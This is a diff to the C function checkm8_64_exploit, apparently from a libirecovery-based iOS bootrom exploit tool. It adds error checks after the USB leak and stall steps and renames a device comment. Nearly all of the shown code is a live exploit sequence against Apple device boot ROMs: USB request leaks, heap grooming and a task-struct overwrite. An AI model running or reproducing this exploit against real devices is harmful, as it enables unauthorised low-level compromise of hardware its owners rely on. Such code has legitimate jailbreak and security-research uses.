@@ -540,14 +540,26 @@ int checkm8_64_exploit(irecv_client_t client, irecv_device_t device_info, const 
     usleep(1000);
     for(int i = 0; i < config.hole; i++) {
         r = no_leak(client);
-        DEBUG_("\x1b[32mno_leak: %x\x1b[39m\n", r);
+        if(r != IRECV_E_TIMEOUT) {
+            printf("\x1b[31mERROR: Failed to no_leak().\x1b[39m\n");
+            irecv_close(client);
+            return -1;
+        }
     }
     
     r = leak(client);
-    DEBUG_("\x1b[32mleak: %x\x1b[39m\n", r);
+    if(r != IRECV_E_TIMEOUT) {
+        printf("\x1b[31mERROR: Failed to leak().\x1b[39m\n");
+        irecv_close(client);
+        return -1;
+    }
     
     r = no_leak(client);
-    DEBUG_("\x1b[32mno_leak: %x\x1b[39m\n", r);
+    if(r != IRECV_E_TIMEOUT) {
+        printf("\x1b[31mERROR: Failed to no_leak().\x1b[39m\n");
+        irecv_close(client);
+        return -1;
+    }
     
     irecv_reset(client);
     
@@ -578,7 +590,7 @@ int checkm8_64_exploit(irecv_client_t client, irecv_device_t device_info, const 
     DEBUG_("\x1b[37mRe-setting overwrite buffer offset\x1b[39m\n");
     
     {
-        // A7 Devices
+        // t8010
         int val = 0x0;
         int origsent = sent;
         DEBUG_("\x1b[37mreceived val: %x\x1b[39m\n", sent);
@@ -665,12 +677,20 @@ int checkm8_64_exploit(irecv_client_t client, irecv_device_t device_info, const 
     
     DEBUG_("\x1b[36mGrooming heap\x1b[39m\n");
     r = usb_req_stall(client);
-    DEBUG_("\x1b[32musb_req_stall: %x\x1b[39m\n", r);
+    if(r != IRECV_E_PIPE) {
+        printf("\x1b[31mERROR: Failed to usb_req_stall().\x1b[39m\n");
+        irecv_close(client);
+        return -1;
+    }
     
     usleep(500);
     for(int i = 0; i < config.leak; i++) {
         r = usb_req_leak(client);
-        DEBUG_("\x1b[32musb_req_leak: %x\x1b[39m\n", r);
+        if(r != IRECV_E_TIMEOUT) {
+            printf("\x1b[31mERROR: Failed to usb_req_leak().\x1b[39m\n");
+            irecv_close(client);
+            return -1;
+        }
     }
     
     DEBUG_("\x1b[36mOverwriting task struct\x1b[39m\n");
